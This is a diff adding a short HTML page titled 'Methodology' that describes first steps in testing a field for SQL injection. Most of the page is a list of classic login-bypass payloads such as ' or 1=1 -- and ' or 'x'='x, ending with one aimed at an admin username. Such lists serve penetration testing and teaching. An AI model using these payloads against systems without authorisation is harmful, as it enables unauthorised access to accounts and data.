@@ -1,0 +1,22 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Methodology</title>
+</head><body>The very first test usually consists of adding a single quote (') , double quote ("") or a semicolon (;) to the field under test.<ul><li style="list-style-type: none">Looking for an error or response of some kind</li>
+</ul>
+Next solution, Use "OR/AND" Operation for testing SQL injection vulnerability<ul><li style="list-style-type: none">Looking for any changes. If the same as original query, probably vulnerable. (error test, if nothing happens, probably vuln)</li>
+<li style="list-style-type: none"></li>
+</ul>
+' or 1=1 --<br/>
+a' or 1=1 --<br/>
+" or 1=1 --<br/>
+a" or 1=1 --<br/>
+' or 1=1 #<br/>
+" or 1=1 #<br/>
+or 1=1 --<br/>
+' or 'x'='x<br/>
+" or "x"="x<br/>
+') or ('x'='x<br/>
+") or ("x"="x<br/>
+' or username LIKE '%admin% </body></html>
